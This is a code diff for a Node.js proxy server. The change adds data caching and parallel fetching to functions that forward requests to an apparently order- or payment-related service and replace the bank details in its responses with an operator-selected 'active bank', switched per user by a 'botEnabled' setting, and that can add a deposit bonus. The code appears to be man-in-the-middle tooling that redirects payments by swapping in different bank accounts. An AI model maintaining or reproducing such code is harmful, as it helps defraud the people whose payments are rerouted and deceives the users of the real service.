@@ -1118,22 +1118,26 @@ app.post('/app/user/register', async (req, res) => {
 });
 
 async function proxyAndReplaceBankDetails(req, res, label) {
-  const data = await loadData();
-  const reqUserId = await extractUserId(req, null);
-  const reqEff = getEffectiveSettings(data, reqUserId);
-  if (reqEff.botEnabled === false) return await transparentProxy(req, res);
+  const bodyOid = req.parsedBody?.orderId || req.parsedBody?.buyOrderNo || req.parsedBody?.orderNo || '';
+  const qOid = req.query?.buyOrderNo || req.query?.orderId || '';
+  const orderBankLookupId = bodyOid || qOid || '';
 
   try {
-    const [proxyResult, orderBankLookupId] = await Promise.all([
-      proxyFetch(req),
-      (async () => {
-        const bodyOid = req.parsedBody?.orderId || req.parsedBody?.buyOrderNo || req.parsedBody?.orderNo || '';
-        const qOid = req.query?.buyOrderNo || req.query?.orderId || '';
-        return bodyOid || qOid || '';
-      })()
+    const [data, proxyResult] = await Promise.all([
+      cachedData ? Promise.resolve(cachedData) : loadData(),
+      proxyFetch(req)
     ]);
+
     const { response, respBody, respHeaders, jsonResp } = proxyResult;
-    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
+    const reqUserId = await extractUserId(req, jsonResp);
+    const reqEff = getEffectiveSettings(data, reqUserId);
+    if (reqEff.botEnabled === false) {
+      res.writeHead(response.status, respHeaders);
+      res.end(respBody);
+      return;
+    }
+
+    const detectedUserId = reqUserId;
     const eff = getEffectiveSettings(data, detectedUserId);
     const active = eff.botEnabled !== false ? getActiveBank(data, detectedUserId) : null;
 
@@ -1202,10 +1206,11 @@ function isActiveOrder(item) {
 }
 
 async function proxyAndReplaceBankInList(req, res) {
-  const data = await loadData();
-
   try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const [data, { response, respBody, respHeaders, jsonResp }] = await Promise.all([
+      cachedData ? Promise.resolve(cachedData) : loadData(),
+      proxyFetch(req)
+    ]);
     const detectedUserId = await extractUserId(req, jsonResp);
     if (detectedUserId) saveTokenUserId(req, detectedUserId);
     const eff = getEffectiveSettings(data, detectedUserId);
@@ -1241,10 +1246,11 @@ async function proxyAndReplaceBankInList(req, res) {
 }
 
 async function proxyAndReplaceBankInActiveOrders(req, res) {
-  const data = await loadData();
-
   try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const [data, { response, respBody, respHeaders, jsonResp }] = await Promise.all([
+      cachedData ? Promise.resolve(cachedData) : loadData(),
+      proxyFetch(req)
+    ]);
     const detectedUserId = await extractUserId(req, jsonResp);
     if (detectedUserId) saveTokenUserId(req, detectedUserId);
 
@@ -1290,9 +1296,11 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
 }
 
 async function proxyAndAddBonus(req, res) {
-  const data = await loadData();
   try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const [data, { response, respBody, respHeaders, jsonResp }] = await Promise.all([
+      cachedData ? Promise.resolve(cachedData) : loadData(),
+      proxyFetch(req)
+    ]);
     const detectedUserId = await extractUserId(req, jsonResp);
     const eff = getEffectiveSettings(data, detectedUserId);
     const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;
